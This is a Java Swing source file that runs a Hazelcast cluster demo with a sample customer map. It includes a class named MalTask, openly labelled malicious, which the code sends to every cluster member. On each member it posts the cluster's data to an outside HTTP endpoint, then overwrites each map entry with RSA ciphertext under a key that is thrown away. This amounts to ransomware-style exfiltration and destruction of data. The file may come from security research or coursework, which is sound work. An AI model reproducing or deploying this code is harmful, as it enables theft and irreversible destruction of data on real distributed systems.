/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.hazelcast.cloud;

import com.hazelcast.config.Config;
import com.hazelcast.config.ListenerConfig;
import com.hazelcast.config.NetworkConfig;
import com.hazelcast.console.Echo;
import com.hazelcast.core.Hazelcast;
import com.hazelcast.core.HazelcastInstance;
import com.hazelcast.core.HazelcastInstanceAware;
import com.hazelcast.core.IExecutorService;
import com.hazelcast.core.IMap;
import com.hazelcast.core.Member;
import com.hazelcast.core.MemberAttributeEvent;
import com.hazelcast.core.MembershipEvent;
import com.hazelcast.core.MembershipListener;
import java.io.IOException;
import java.io.Serializable;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.swing.DefaultListModel;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 *
 * @author farhan
 */
public class hazelcastServer extends javax.swing.JFrame {

    ArrayList<HazelcastInstance> hazelcastInstances = new ArrayList<HazelcastInstance>();
    int nodes_iterator = -1;
    Config config;

    /**
     * Creates new form hazelcast
     */
    public hazelcastServer() {
        initComponents();
        this.config = new Config();
        NetworkConfig network = this.config.getNetworkConfig();
        network.setPort(5701).setPortCount(20);
        network.setPortAutoIncrement(true);
        config.addListenerConfig(new ListenerConfig("com.hazelcast.cloud.ClusterMembershipListener"));
        this.hazelcastInstances.add(Hazelcast.newHazelcastInstance(this.config));
        this.nodes_iterator += 1;

        Map<Integer, String> mapCustomers = this.hazelcastInstances.get(this.nodes_iterator).getMap("customers");
        mapCustomers.put(1, "Joe");
        mapCustomers.put(2, "Ali");
        mapCustomers.put(3, "Farhan");
        mapCustomers.put(4, "Nasim");
        mapCustomers.put(5, "William");
        mapCustomers.put(6, "Vipul");

        this.update_nodes();
    }

    public hazelcastServer(String str) {

    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        add_node_btn = new javax.swing.JButton();
        check_nodes_btn = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        nodes_list = new javax.swing.JList();
        jScrollPane2 = new javax.swing.JScrollPane();
        map_data_list = new javax.swing.JList<>();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        data_btn = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("HazelCast Server");
        setPreferredSize(new java.awt.Dimension(800, 500));

        add_node_btn.setText("Add Node / Member");
        add_node_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                add_node_btnActionPerformed(evt);
            }
        });

        check_nodes_btn.setText("Check Nodes / Memebrs");
        check_nodes_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                check_nodes_btnActionPerformed(evt);
            }
        });

        jScrollPane1.setViewportView(nodes_list);

        jScrollPane2.setViewportView(map_data_list);

        jLabel1.setFont(new java.awt.Font("sansserif", 0, 14)); // NOI18N
        jLabel1.setText("Nodes:");

        jLabel2.setFont(new java.awt.Font("sansserif", 0, 14)); // NOI18N
        jLabel2.setText("Map Data:");

        data_btn.setText("Check Data");
        data_btn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                data_btnActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 140, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 140, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(76, 76, 76))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addComponent(add_node_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 172, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(33, 33, 33)
                                .addComponent(check_nodes_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 172, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 453, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                .addGap(0, 29, Short.MAX_VALUE)
                                .addComponent(data_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 172, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(36, 36, 36)))
                        .addContainerGap())))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(27, 27, 27)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(check_nodes_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(add_node_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(data_btn, javax.swing.GroupLayout.PREFERRED_SIZE, 49, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(24, 24, 24)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 16, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 16, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane2)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 272, Short.MAX_VALUE))
                .addContainerGap())
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void add_node_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_add_node_btnActionPerformed
        // TODO add your handling code here:
        this.hazelcastInstances.add(Hazelcast.newHazelcastInstance(this.config));
        this.nodes_iterator += 1;

        this.update_nodes();
    }//GEN-LAST:event_add_node_btnActionPerformed

    private void check_nodes_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_check_nodes_btnActionPerformed
        // TODO add your handling code here:
        this.update_nodes();
    }//GEN-LAST:event_check_nodes_btnActionPerformed

    public void update_nodes() {
        Set<Member> members = this.hazelcastInstances.get(this.nodes_iterator).getCluster().getMembers();
        DefaultListModel dlm = new DefaultListModel();
        members.forEach((element) -> {
            System.out.println(element.toString());
            dlm.addElement(element.toString());
        });
        this.nodes_list.setModel(dlm);
    }

    public void executeTasks() {
        System.out.println("Function Called.... " + this.nodes_iterator);

        Map<Integer, String> mapCustomers = this.hazelcastInstances.get(this.nodes_iterator).getMap("customers");
        mapCustomers.forEach((k, v) -> {
            System.out.println(k.toString() + "  -  " + v.toString());
        });

        IExecutorService executorService = this.hazelcastInstances.get(this.nodes_iterator).getExecutorService("executorService");
        MalTask malTask = new MalTask();
        malTask.setHazelcastInstance(this.hazelcastInstances.get(this.nodes_iterator));
        executorService.executeOnAllMembers(malTask);
    }

    private void data_btnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_data_btnActionPerformed
        // TODO add your handling code here:
        Map<Integer, String> mapCustomers = this.hazelcastInstances.get(this.nodes_iterator).getMap("customers");
        DefaultListModel dlm = new DefaultListModel();
        mapCustomers.forEach((k, v) -> {
            dlm.addElement(k.toString() + "  -  " + v.toString());
        });
        this.map_data_list.setModel(dlm);
    }//GEN-LAST:event_data_btnActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(hazelcastServer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(hazelcastServer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(hazelcastServer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(hazelcastServer.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton add_node_btn;
    private javax.swing.JButton check_nodes_btn;
    private javax.swing.JButton data_btn;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JList<String> map_data_list;
    private javax.swing.JList nodes_list;
    // End of variables declaration//GEN-END:variables
}

class MalTask implements Runnable, Serializable, HazelcastInstanceAware {

    String api_url = "http://localhost:3000";
    private transient HazelcastInstance hazelcastInstance;

    public MalTask() {
    }

    public void setHazelcastInstance(HazelcastInstance hazelcastInstance) {
        this.hazelcastInstance = hazelcastInstance;
    }

    @Override
    public void run() {
        System.out.println("Malicious Task is Executed Now...");
        try {
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url(this.api_url +  "/encryption")
                    .get()
                    .addHeader("Accept", "*/*")
                    .addHeader("accept-encoding", "gzip, deflate")
                    .addHeader("Connection", "keep-alive")
                    .build();

            Response response = client.newCall(request).execute();
            System.out.println("Server Response: " + response.body().string());
            
            Set<Member> members = hazelcastInstance.getCluster().getMembers();
            Map<Integer, String> mapCustomers = hazelcastInstance.getMap("customers");
            post_data_on_server(members.size(), mapCustomers.toString());
            
            System.out.println("Original Data: " + mapCustomers);
            mapCustomers.forEach((k, v) -> {
                try {
                    System.out.println("Original Data: " + v);
                    String encrypted_data = encryption(v.toString());
                    System.out.println("Encrypted Data: " + encrypted_data);
                    mapCustomers.put(k, encrypted_data);
                } catch (Exception e) {
                    System.out.println("Exception: " + e.getMessage());
                }
            });
        } catch (IOException ex) {
            Logger.getLogger(MalTask.class.getName()).log(Level.SEVERE, null, ex);
            System.out.println(ex.getMessage());
        }
    }

    public String encryption(String input) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, UnsupportedEncodingException {
        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance("RSA");
        //Initializing the KeyPairGenerator
        keyPairGen.initialize(2048);
        //Generate the pair of keys
        KeyPair pair = keyPairGen.generateKeyPair();
        //Getting the public key from the key pair
        PublicKey publicKey = pair.getPublic();
        //Creating a Cipher object
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        //Initializing a Cipher object
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        //Adding data to the cipher
        byte[] inputStr = input.getBytes();
        cipher.update(inputStr);
        //Encrypting the data
        byte[] cipherText = cipher.doFinal();
        return new String(cipherText, "UTF8");
    }

    public void post_data_on_server(int total_nodes, String data) throws IOException {
        OkHttpClient client = new OkHttpClient();

        MediaType mediaType = MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
        RequestBody body = RequestBody.create(mediaType, "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"nodes\"\r\n\r\n" + total_nodes + "\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\n" + data + "\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--");
        Request request = new Request.Builder()
                .url(this.api_url +  "/encryption")
                .post(body)
                .addHeader("content-type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
                .addHeader("User-Agent", "PostmanRuntime/7.15.2")
                .addHeader("Accept", "*/*")
                .addHeader("Cache-Control", "no-cache")
                .addHeader("Postman-Token", "a475892d-6314-4758-af11-2a5cb00e3835,eadaa13a-2d41-4930-8a20-bdbd4cab227a")
                .addHeader("Host", "localhost:3000")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .addHeader("Content-Type", "multipart/form-data; boundary=--------------------------097379789404498137934314")
                .addHeader("Content-Length", "276")
                .addHeader("Connection", "keep-alive")
                .addHeader("cache-control", "no-cache")
                .build();

        Response response = client.newCall(request).execute();
        System.out.println("Post Request Response: " + response.body().string());
    }
}
